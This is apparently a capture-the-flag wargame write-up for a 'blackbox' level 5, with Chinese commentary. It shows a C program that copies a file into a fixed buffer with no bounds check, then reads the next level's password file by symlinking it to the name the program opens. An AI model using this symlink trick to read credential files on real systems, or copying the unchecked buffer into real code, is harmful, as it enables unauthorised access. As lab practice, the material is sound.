level5@blackbox:~$ ls
list  list.c  password
level5@blackbox:~$ cat list.c
#include <stdio.h>


int main(int argc, char **argv)
{
        char buf[100];
        size_t len;
        char fixedbuf[10240];
        FILE *fh;
        char *ptr = fixedbuf;
        int i;

        fh = fopen("somefile", "r");
        if(!fh)
                return 0;
       // size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);
        while((len = fread(buf, 1, 100, fh)) > 0) {
                for(i = 0; i < len; i++) {
                        // Disable output modifiers
                        switch(buf[i]) {
                        case 0xFF:
                        case 0x00:
                        case 0x01:
                                break;
                        default:
                                *ptr = buf[i];
                                ptr++;
                        }
                }
        }
        printf("%s", fixedbuf);

        fclose(fh);
}
level5@blackbox:~$ 

读取一个文件，想到通过给/home/level6/password创建一个符号链接：somefile
然后让程序读取这个符号链接，从而读取内容
level5@blackbox:/tmp/level5$ ln -s /home/level6/password somefile 
level5@blackbox:/tmp/level5$ /home/level5/list 
OverWritten!
level5@blackbox:/tmp/level5$ 
